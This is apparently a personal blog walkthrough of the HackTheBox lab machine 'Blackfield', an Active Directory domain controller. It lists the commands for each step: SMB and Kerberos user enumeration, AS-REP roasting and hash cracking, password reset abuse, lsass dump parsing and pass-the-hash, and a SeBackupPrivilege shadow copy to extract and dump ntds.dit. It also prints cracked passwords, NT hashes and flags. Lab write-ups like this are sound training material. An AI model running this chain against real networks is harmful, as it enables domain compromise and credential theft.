+++
title = "HTB - Blackfield"
date = 2024-09-12
+++

Blackfield is an extremely smooth box that champions AD research, thorough enumeration, a fair bit of lateral movement, and information transfer techniques. Let's get into it.

### Scan

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-12 17:18 EDT
Nmap scan report for 10.10.10.192
Host is up (0.12s latency).
Not shown: 993 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
389/tcp  open  ldap
445/tcp  open  microsoft-ds
593/tcp  open  http-rpc-epmap
3268/tcp open  globalcatLDAP

Nmap done: 1 IP address (1 host up) scanned in 8.80 seconds
----------

```

From the scan, we can see we're dealing with a domain controller via `kerberos`. We've got SMB, RPC, and some LDAP POE. Let's see what we can find.
### Enumeration

I tried to get a zone transfer with `dig` and `nslookup`, but no dice. I figured this box would be more locked away than Forest or Bastard, so I knew this would be extremely low hanging fruit anyways. 

We can, though, get a hit authenticating as the `null` user with `smbclient`. Make sure your `/etc/hosts` is configured properly.

 `smbclient --list //blackfield.local --no-pass`
 
![[Screenshot 2024-09-18 at 8.41.47 AM.png]]

I wasn't able to get `smbmap` to list shares properly - I think it's a version issue. I had to manually try to connect to each with `smbclient`. 

`smbclient //blackfield.local/profiles$ -N`

We've only access to profiles, and upon viewing, we get around 300 users. 

![[Screenshot 2024-09-20 at 11.57.12 AM.png]]

We can save the names to `users.txt`, and clean this up for a file to feed into `kerbrute`. 

`cat users.txt | awk '{print $1}' > user.txt`

### Initial Access

`./kerbrute_linux_arm64 userenum -d blackfield.local --dc 10.10.10.192 /home/li0t/Desktop/HTB/Blackfield/user.txt` 
 
![[Screenshot 2024-09-18 at 9.28.09 AM.png]]

We can see that we've got three hits, `audit2020`, `support`, and  `svc_backup`. I want to iterate that the hashes (at least in my setup) are often always erroneous when dumped by `kerbrute`. We'll need to use `impacket` to certify which users have TGTs and what the values are should they have them.

`python3 GetNPUsers.py -no-pass -dc-ip 10.10.10.192 blackfield.local/support`

Through trial and error, `support` is the only account that's valid! Now, we can copy the hash into a file and let `john` try and crack the password for us. Make sure that there are no new line characters or gaps at the end! (I know there's a way to denote this in a parameter while configuring the hash file... I'll find it later.)

`john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`

![[Screenshot 2024-09-18 at 9.34.22 AM.png]]

We've cracked the password: `#00^BlackKnight`

Now, as I always note, it's important to restart the enumeration process now that we have credentials. We'll start with looking again at the SMB shares. `smbmap` seems to work now.

`smbmap -H 10.10.10.192 -u "support" -p "#00^BlackKnight"`

There's nothing crazy here, just password policy information, which doesn't hurt to have. This let me know that with a minimum length of `7`, brute forcing a password without a hash is probably not going to happen. Let's turn to other methods to continue enumeration.

Because we don't have a shell, and we don't have access to system info, we can try the  `python-bloodhound` ingester to further enumerate.

`bloodhound-python -d blackfield.local -u support -p "#00^BlackKnight" -ns 10.10.10.192 -c all`

We can take a look at all of these relationships, but it's very crucial to check all of the queries pertaining to the account we've compromised. In doing so, we figure out that we can change the password for user `audit2020`

![[Screenshot 2024-09-18 at 9.57.27 AM.png]]

To do this, we can  use `impacket` with the `changepasswd` script.

`python3 changepasswd.py -altuser support -altpass "#00^BlackKnight" blackfield.local/audit2020@10.10.10.192 -reset`

![[Screenshot 2024-09-20 at 12.17.41 PM.png]]

Having access to another account, what do we do? You guessed it, reenumerate. Let's start with SMB, again.

`smbmap -H 10.10.10.192 -u "audit2020" -p "password"`

Now, we have access to quite a bit. Forensic shares is what's new, so we'll go there.

With so much content, perusing through the SMB interface can be slow and intensive. You can mount the share to a directory of your choice with the following:

`mount -t cifs -o 'username=audit2020,password=password' //blackfield.local/forensic /home/li0t/Desktop/HTB/Blackfield/mnt`

![[Screenshot 2024-09-20 at 12.31.21 PM.png]]

![[Screenshot 2024-09-20 at 12.31.51 PM.png]]

We're privy to a lot here, including information regarding users, groups, admins, firewall rules, and the `lsass` file. This file stands for the `Local Security Authority Subsytem Service`, and it holds the responsibility of enforcing security policies on the system. We can get very valuable information here.

When done, make sure to `umount`.

We can discover and dump secrets with a tool called `pypykatz`, a python branch off of `mimikatz.exe` that's written exclusively in python, which allows us to use it on unix systems. 

`pypykatz lsa minidump lsass.DMP | grep -B 3 -A 2 'NT:'` 

The former command will dump secrets, and the latter will format our results into something pleasant, so we can parse for useful information easier.

![[Screenshot 2024-09-20 at 12.36.15 PM.png]]

We get info for a lot of users, including `administrator` and `svc_backup`.

When we try to pass hashes with `smbclient //10.10.10.192/ADMIN$ -U "administrator" --pw-nt-hash '7f1e4ff8c6a8e6b6fcae2d9c0572cd62'`, we're met with logon failure. That would've been too easy ;).

When we try `svc_backup`, using:

`smbclient //10.10.10.192/C$ -U "svc_backup" --pw-nt-hash '9658d1d1dcd9250115e2205d9f48400d'`

![[Screenshot 2024-09-20 at 12.46.20 PM.png]]

We're able to get access! We can peruse or mount the share, but either way, grab the user flag.

`USER:3920bb317a0bef51027e2852be64b543`

### Privilege Escalation

I like to try `evil-winrm` for every user, even though the ports don't telegraph it's operation on this box. It finally works with `svc_backup`.

![[Screenshot 2024-09-20 at 12.49.17 PM.png]]

We find a note in the while rooting around in the base directory.

![[Screenshot 2024-09-18 at 1.15.59 PM.png]]

A bit of housekeeping here. We notice, in the `whoami /all` output and note, the mention of backing up privileges tied to this account. We can confirm with Bloodhound. It's called `SEBackupPrivilege`. In theory, we should then be able to backup data, namely the `SYSTEM`, `SAM`, and `ntds.dit` directories. These are the important files that allow us to get access to critical AD information. Once we back it up, we should be able to transfer the copies to our machine, where we can dump secrets!

Also, before we do anything, let's create a `/temp` directory where we can keep things organized while we work. If this was a real assessment, we'd need to make sure to clean this up afterwards.

It took me awhile to figure this out, and in the meantime, I tried to run various priv-esc scripts on the machine. I couldn't get a single file to run, and I think it was because of AV software. Just points that I should've known to look elsewhere!
Let the answers guide you...

We can use the following sequence of commands to creates a shadow copy of the `C:\` drive, in doing so, we'll be able to access any file we want, including the `SYSTEM` and `SAM` file. `diskshadow.exe` is the tool, and it's already installed on windows servers by default. The caveat is, because using the tool requires an interactive session, we'll have to make a `.txt` file emulating the data that we can feed into `diskshadow.exe`. Then, we can execute the necessary commands to create the shadow. The headlined version of the commands is this: We tell `diskshadow` to create a copy of `C:` and name it `Z:`, while making it accessible to us.

```
echo "set context persistent nowriters" | out-file ./diskshadow.txt -encoding ascii
echo "add volume c: alias temp" | out-file ./diskshadow.txt -encoding ascii -append
echo "create" | out-file ./diskshadow.txt -encoding ascii -append        
echo "expose %temp% z:" | out-file ./diskshadow.txt -encoding ascii -append
```

Now, after checking to see that the drive was created, and it has the files we need, we can transfer them to our `/temp` directory with `robocopy`.

`robocopy /b Z:\Windows\System32\Config C:\temp SAM`
`robocopy /b Z:\Windows\System32\Config C:\temp SYSTEM`
`robocopy /b Z:\Windows\ntds C:\temp NTDS`

Now we can download them onto our machine:

`download ntds.dit`
`dowload SAM`
`download SYSTEM`

We can rely on `impacket` to dump the secrets with the command below:

`python3 secretsdump.py -system SYSTEM -ntds ntds.dit -sam SAM LOCAL`

MAKE SURE TO USE CORRECT `secretsdump.py`. Some are finicky and will not work. If you have issues, do 
`pip3 install .` in the root directory of the tool. Copy the new version over and try again.

Make sure to use the correct version of the `Administrator` hashes.

Once gotten, use the NT part of the hash to change `evil-winrm` shells:

`evil-winrm -i 10.10.10.192 -u "administrator" -H'184fb5e5178480be64824d4cd53b99ee'`

Flag and profit!

![[Screenshot 2024-09-18 at 2.58.09 PM.png]]

`ROOT:4375a629c7c67c8e29db269060c955cb`

NOTE: The `psexec.py` is supposed to drop a shell as well, but no matter what I tried, the process kept hanging. May be of use later though.

#hard #windows #manual 
